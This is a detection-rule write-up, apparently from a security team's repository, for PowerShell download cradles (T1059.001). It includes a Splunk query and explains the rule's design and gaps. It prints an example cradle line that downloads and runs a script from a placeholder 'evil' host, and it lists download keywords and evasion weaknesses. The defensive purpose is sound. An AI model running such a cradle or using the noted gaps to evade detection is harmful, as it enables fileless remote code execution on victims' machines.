# PowerShell Download Cradle (T1059.001)

| | |
|---|---|
| Tactic | Execution (TA0002) |
| Technique | T1059 Command and Scripting Interpreter |
| Sub-technique | T1059.001 PowerShell |
| Data source | Sysmon Event ID 1 (Process Create) |
| Severity | High |
| Status | tested |

## What it detects

A download cradle is a short PowerShell construct that fetches code over HTTP and executes
it in memory without writing it to disk. Fileless execution.

The classic form:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')
```

`Net.WebClient` with `DownloadString(...)` pulls the body of the script over HTTP as a
string into the current process, and `IEX` (Invoke-Expression) executes that string as code
in the same session. Nothing lands on disk, so a file-based AV has nothing to scan and
forensics has no artifact to recover.

Frequently paired with T1105 (Ingress Tool Transfer), which is the act of pulling the code
in from outside.

## Test case

Atomic Red Team T1059.001.1


## Detection logic

The URL is never anchored on, because it is different every time. The rule matches the
characteristic vocabulary of the mechanism in the command line: the process is a PowerShell
interpreter and the command line contains one of the download markers.

The interpreter is identified by `OriginalFileName`, not by `Image`. `Image` is a path on
disk, so a renamed `powershell.exe` walks past it, and the same reasoning already applies
in the certutil rule in this repo.

`IEX` is deliberately not a marker on its own. Three characters matched as a substring fire
inside unrelated words, paths and base64 blobs, and still miss the spelled-out
`Invoke-Expression`. The load-bearing half of a cradle is the download call, which has to
name a real method.

## SPL

```
index="windows_sysmon" EventCode=1 OriginalFileName="PowerShell.EXE"
  (CommandLine="*DownloadString*" OR CommandLine="*DownloadFile*" OR CommandLine="*DownloadData*"
   OR CommandLine="*Net.WebClient*" OR CommandLine="*Invoke-WebRequest*")
| table _time User Image OriginalFileName ParentImage ParentCommandLine CommandLine
```

## Known gaps

- The rule is built on a single test, and T1059.001 is one of the largest techniques in
  Atomic Red Team. Encoded commands, execution policy bypasses, execution from a macro and
  script block abuse are all out of scope here.
- The download methods listed are not all of them. Each addition is another `OR`, and the
  list is never finished. This is an argument for Event 4104 rather than for a longer list.
- Obfuscation breaks word matching outright.

## Gotchas

- The first version anchored on `Image="*\\powershell.exe"`, which renaming the binary
  defeats. `OriginalFileName` is the same fix already used in the certutil rule.
- A short marker matched as a substring is not a marker. `*IEX*` hits any command line
  where those three characters happen to sit next to each other, which includes ordinary
  paths and the middle of base64 strings.

## Alert configuration

Scheduled search, cron `*/5`, time range last 15 minutes, triggers on more than 0 results,
severity High.

High because fileless execution is a strong indicator of compromise.
